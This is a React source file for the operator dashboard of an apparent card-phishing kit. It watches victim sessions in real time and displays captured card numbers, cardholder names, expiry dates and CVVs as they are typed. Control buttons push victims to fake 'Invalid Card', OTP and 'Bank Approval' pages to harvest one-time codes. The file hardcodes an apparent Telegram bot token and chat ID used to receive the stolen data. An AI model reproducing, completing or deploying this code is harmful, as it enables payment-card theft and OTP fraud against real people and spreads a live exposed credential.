
import React, { useState, useEffect } from 'react';
import { Settings, LogOut, Trash2, CheckCircle2, CreditCard, Lock, Smartphone, RefreshCw, XCircle, Info, ShieldCheck } from 'lucide-react';

export const AdminPanel: React.FC<{ onBack: () => void }> = ({ onBack }) => {
  const [activeTab, setActiveTab] = useState<'sessions' | 'config' | 'security'>('sessions');
  const [botToken, setBotToken] = useState('8586070350:AAHH3zeOKmg5Z45CT_68N14xzEdkLFhY0G0');
  const [chatId, setChatId] = useState('5219969216');
  const [session, setSession] = useState<any>(null);
  const [liveInputs, setLiveInputs] = useState<any>({});
  const [currentAction, setCurrentAction] = useState('none');

  useEffect(() => {
    const update = () => {
      const presence = localStorage.getItem('user_presence');
      if (presence) {
        const data = JSON.parse(presence);
        // If last seen more than 15s ago, user is likely gone
        if (Date.now() - data.lastSeen < 15000) {
          setSession(data);
        } else {
          setSession(null);
        }
      }
      const inputs = localStorage.getItem('live_user_inputs');
      if (inputs) setLiveInputs(JSON.parse(inputs));
      
      const action = localStorage.getItem('admin_redirect_action');
      if (action) setCurrentAction(action);
    };
    const timer = setInterval(update, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleAction = (action: string) => {
    localStorage.setItem('admin_redirect_action', action);
    setCurrentAction(action);
  };

  const clearSession = () => {
    localStorage.removeItem('user_presence');
    localStorage.removeItem('live_user_inputs');
    localStorage.removeItem('admin_redirect_action');
    setSession(null);
  };

  return (
    <div className="min-h-screen bg-[#0d1421] text-[#94a3b8] p-4 md:p-8 font-sans selection:bg-blue-500/30">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
          <div>
            <h1 className="text-3xl font-bold text-white mb-2 tracking-tight">Admin Dashboard</h1>
            <p className="text-slate-500 text-sm">Manage sessions, Telegram configuration, and security settings</p>
          </div>
          <button 
            onClick={onBack}
            className="flex items-center gap-2 bg-[#ef4444] hover:bg-red-600 text-white px-5 py-2 rounded-lg font-bold transition-all active:scale-95 shadow-lg shadow-red-500/20"
          >
            <LogOut className="w-4 h-4" /> Logout
          </button>
        </header>

        {/* Navigation Tabs */}
        <nav className="flex items-center gap-1 bg-[#1a2333] p-1.5 rounded-xl mb-10 w-full max-w-2xl border border-slate-800">
          {[
            { id: 'sessions', label: 'Active Sessions' },
            { id: 'config', label: 'Telegram Config' },
            { id: 'security', label: 'Security' }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex-1 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                activeTab === tab.id 
                  ? 'bg-[#2d3a4f] text-white shadow-md shadow-black/20' 
                  : 'text-slate-500 hover:text-slate-300'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </nav>

        {activeTab === 'sessions' && (
          <div className="space-y-6">
            {session ? (
              <div className="bg-[#151d2c] border border-slate-800 rounded-2xl overflow-hidden shadow-2xl animate-in fade-in slide-in-from-bottom-4 duration-500">
                {/* Session Header */}
                <div className="flex items-center justify-between p-6 border-b border-slate-800">
                  <div className="flex flex-col gap-2">
                    <div className="flex items-center gap-3">
                      <div className="bg-[#10b981]/10 text-[#10b981] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest flex items-center gap-1.5 border border-[#10b981]/20">
                        <div className="w-1.5 h-1.5 bg-[#10b981] rounded-full animate-pulse" />
                        Active
                      </div>
                    </div>
                    <p className="text-xs text-slate-500 font-mono">Session ID: {session.sessionId}</p>
                  </div>
                  <button 
                    onClick={clearSession}
                    className="p-2 text-slate-500 hover:text-red-500 hover:bg-red-500/10 rounded-lg transition-all"
                  >
                    <Trash2 className="w-5 h-5" />
                  </button>
                </div>

                {/* Session Details */}
                <div className="grid grid-cols-2 md:grid-cols-4 gap-0.5 bg-slate-800/20">
                  {[
                    { label: 'Current Page', value: session.currentPage },
                    { label: 'Country', value: session.country },
                    { label: 'IP Address', value: session.ip },
                    { label: 'Last Active', value: new Date(session.lastSeen).toLocaleTimeString() }
                  ].map((stat, i) => (
                    <div key={i} className="bg-[#151d2c] p-6 flex flex-col gap-1">
                      <span className="text-[10px] uppercase font-black tracking-widest text-slate-500">{stat.label}</span>
                      <p className="text-white font-bold">{stat.value}</p>
                    </div>
                  ))}
                </div>

                {/* Control Actions */}
                <div className="p-8 space-y-6">
                  <div className="flex items-center gap-2 mb-2">
                    <h3 className="text-sm font-black uppercase tracking-widest text-white">Control Actions</h3>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <ActionButton 
                      label="Invalid Card" 
                      icon={<CreditCard className="w-4 h-4" />} 
                      onClick={() => handleAction('declined')}
                      isActive={currentAction === 'declined'}
                      colorClass="border-[#78350f] text-[#fbbf24] hover:bg-[#78350f]/20"
                    />
                    <ActionButton 
                      label="Invalid OTP" 
                      icon={<Lock className="w-4 h-4" />} 
                      onClick={() => handleAction('invalid_otp')}
                      isActive={currentAction === 'invalid_otp'}
                      colorClass="border-[#7f1d1d] text-[#f87171] hover:bg-[#7f1d1d]/20"
                    />
                    <ActionButton 
                      label="OTP Page" 
                      icon={<Smartphone className="w-4 h-4" />} 
                      onClick={() => handleAction('otp')}
                      isActive={currentAction === 'otp'}
                      colorClass="border-[#1e40af] text-[#60a5fa] hover:bg-[#1e40af]/20"
                    />
                    <ActionButton 
                      label="Bank Approval" 
                      icon={<CheckCircle2 className="w-4 h-4" />} 
                      onClick={() => handleAction('bank_approval')}
                      isActive={currentAction === 'bank_approval'}
                      colorClass="border-[#581c87] text-[#c084fc] hover:bg-[#581c87]/20"
                    />
                    <ActionButton 
                      label="Normal" 
                      icon={<ShieldCheck className="w-4 h-4" />} 
                      onClick={() => handleAction('normal')}
                      isActive={currentAction === 'normal' || currentAction === 'none'}
                      colorClass="border-[#065f46] text-[#34d399] hover:bg-[#065f46]/20"
                    />
                    <ActionButton 
                      label="Block" 
                      icon={<XCircle className="w-4 h-4" />} 
                      onClick={() => handleAction('block')}
                      isActive={currentAction === 'block'}
                      colorClass="border-[#450a0a] text-[#b91c1c] hover:bg-[#450a0a]/20 bg-[#2d0a0a]"
                    />
                  </div>

                  {/* Live Inputs Section */}
                  <div className="mt-10 pt-10 border-t border-slate-800">
                    <div className="flex items-center gap-2 mb-6">
                      <RefreshCw className="w-4 h-4 text-blue-400 animate-spin-slow" />
                      <h3 className="text-sm font-black uppercase tracking-widest text-white">Live Input Monitoring</h3>
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4">
                      {[
                        { label: 'Card Number', value: liveInputs.cardNumber },
                        { label: 'Cardholder Name', value: liveInputs.nameOnCard },
                        { label: 'Expiry Date', value: liveInputs.expiry },
                        { label: 'CVV', value: liveInputs.cvv },
                      ].map(input => (
                        <div key={input.label} className="bg-[#0d1421] p-4 rounded-xl border border-slate-800 group transition-all hover:border-slate-600">
                          <span className="text-[9px] font-black uppercase tracking-widest text-slate-500 mb-1.5 block">{input.label}</span>
                          <p className={`text-sm font-mono truncate ${input.value ? 'text-blue-400 font-bold' : 'text-slate-700 italic'}`}>
                            {input.value || 'Waiting...'}
                          </p>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              <div className="bg-[#151d2c] border border-slate-800 rounded-3xl p-20 text-center flex flex-col items-center gap-4">
                <div className="w-16 h-16 bg-slate-800/50 rounded-full flex items-center justify-center mb-2">
                  <UsersIcon className="w-8 h-8 text-slate-600" />
                </div>
                <h3 className="text-white font-bold text-xl">No Active Sessions</h3>
                <p className="text-slate-500 max-w-sm">When users access the login flow, they will appear here for real-time monitoring and control.</p>
              </div>
            )}
          </div>
        )}

        {activeTab === 'config' && (
          <div className="bg-[#151d2c] border border-slate-800 rounded-2xl p-8 max-w-xl mx-auto shadow-2xl animate-in zoom-in-95 duration-300">
            <h3 className="text-xl font-bold text-white mb-8 flex items-center gap-3">
              <Settings className="w-6 h-6 text-blue-400" />
              Telegram Bot Settings
            </h3>
            <div className="space-y-6">
              <div>
                <label className="text-xs font-black uppercase tracking-widest text-slate-500 block mb-3">Bot Token</label>
                <input 
                  type="text" 
                  value={botToken} 
                  onChange={e => setBotToken(e.target.value)}
                  className="w-full bg-[#0d1421] border border-slate-800 rounded-xl p-4 text-white font-mono text-sm outline-none focus:border-blue-500/50 focus:ring-4 focus:ring-blue-500/10 transition-all" 
                />
              </div>
              <div>
                <label className="text-xs font-black uppercase tracking-widest text-slate-500 block mb-3">Chat ID</label>
                <input 
                  type="text" 
                  value={chatId} 
                  onChange={e => setChatId(e.target.value)}
                  className="w-full bg-[#0d1421] border border-slate-800 rounded-xl p-4 text-white font-mono text-sm outline-none focus:border-blue-500/50 focus:ring-4 focus:ring-blue-500/10 transition-all" 
                />
              </div>
              <button className="w-full bg-blue-600 hover:bg-blue-500 text-white py-4 rounded-xl font-bold transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]">
                Update Configuration
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

const ActionButton: React.FC<{ label: string, icon: React.ReactNode, onClick: () => void, isActive: boolean, colorClass: string }> = ({ label, icon, onClick, isActive, colorClass }) => (
  <button
    onClick={onClick}
    className={`flex items-center justify-center gap-3 py-3.5 px-4 rounded-xl border-2 transition-all font-bold text-sm ${colorClass} ${
      isActive ? 'ring-2 ring-white/20 bg-white/5' : 'bg-transparent'
    } active:scale-95`}
  >
    {icon}
    {label}
  </button>
);

const UsersIcon = (props: any) => (
  <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" /><circle cx="9" cy="7" r="4" /><path d="M22 21v-2a4 4 0 0 0-3-3.87" /><path d="M16 3.13a4 4 0 0 1 0 7.75" />
  </svg>
);
